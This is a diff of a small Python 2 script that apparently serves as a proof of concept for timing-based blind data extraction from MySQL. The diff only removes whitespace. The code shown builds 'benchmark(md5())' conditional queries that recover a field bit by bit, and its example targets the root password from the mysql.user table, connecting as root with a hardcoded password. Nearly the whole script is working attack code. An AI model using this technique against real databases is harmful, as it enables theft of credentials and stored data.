@@ -4,11 +4,9 @@
 # Author Dario Clavijo 2015
 
 import time,sys,os
-
 import MySQLdb
 
 db = MySQLdb.connect(host="localhost",user="root", passwd="password", db="mysql") # name of the data base
-
 cur = db.cursor() 
 
 #make iters longer for reliability, smaller for speed
@@ -23,7 +21,6 @@ def measure(sql):
 
 def getlength(field,table,where):
 	accum = 0
-
 	mintime = measure("select curdate()")
 	
 	for bitpos in [128,64,32,16,8,4,2,1]:
@@ -35,20 +32,15 @@ def getlength(field,table,where):
 			accum += bitpos
 		else:
 			bit = 0
-
 		print "time:",_time,",bit:",bit
 
-		
-	
 	return accum
 
 def getbits(pos,field,table,where):
 	accum = 0
-
 	mintime = measure("select curdate()")
 	
 	for bitpos in [128,64,32,16,8,4,2,1]:
-
 		sql = "select if(ord(substring(%s,%d,1)) & %d,benchmark(%d,md5('cc')),0) from %s where %s;" % (field,pos,bitpos,iters,table,where) 
 		_time = measure(sql)
 		
@@ -58,10 +50,8 @@ def getbits(pos,field,table,where):
 		else:
 			bit = 0
 		print "time:",_time,",bit:",bit
-		
 	
 	return accum
-
 
 def getdata(field,table,where):
 	tmp = ""
@@ -74,6 +64,5 @@ def getdata(field,table,where):
 	return tmp
 
 # example against mysql users table
-
 data = getdata('password','user',"user='root' limit 1")
 print "RECOVERED DATA:", data
